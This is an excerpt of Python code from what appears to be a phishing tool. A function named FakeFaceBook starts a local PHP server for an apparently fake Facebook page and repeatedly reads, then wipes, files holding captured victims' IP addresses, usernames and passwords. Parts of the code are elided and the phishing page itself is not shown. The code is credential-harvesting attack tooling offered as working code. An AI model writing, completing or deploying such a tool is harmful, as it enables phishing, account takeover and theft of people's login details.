...
def FakeFaceBook():
    ...
    with open("log/server.txt", "w") as phplog:
        Popen(("php","-S","localhost:6060","-t","modules/index/02/"),stderr=phplog,stdout=phplog)
        ...
        def IP():
            FS = 0
            if not int(os.stat('modules/index/02/ip_data.txt').st_size) == int(FS):
                ip_file = open('modules/index/02/ip_data.txt', 'r')
                ip = ip_file.read()
                ip_file.close()
                ...
                ip_clear = open('modules/index/02/ip_data.txt', 'w')
                ip_clear.write('')
                ip_clear.close()
        ...
        def UP():
            FS = 0
            if not int(os.stat('modules/index/02/u_data.txt').st_size) == int(FS):
                #password
                p_file = open('modules/index/02/p_data.txt', 'r')
                p = p_file.read()
                p_file.close()

                #username
                u_file = open('modules/index/02/u_data.txt', 'r')
                u = u_file.read()
                u_file.close()
                ...
                #clear-username
                u_clear = open('modules/index/02/u_data.txt', 'w')
                u_clear.write('')
                u_clear.close()

                #clear-password
                p_clear = open('modules/index/02/p_data.txt', 'w')
                p_clear.write('')
                p_clear.close()
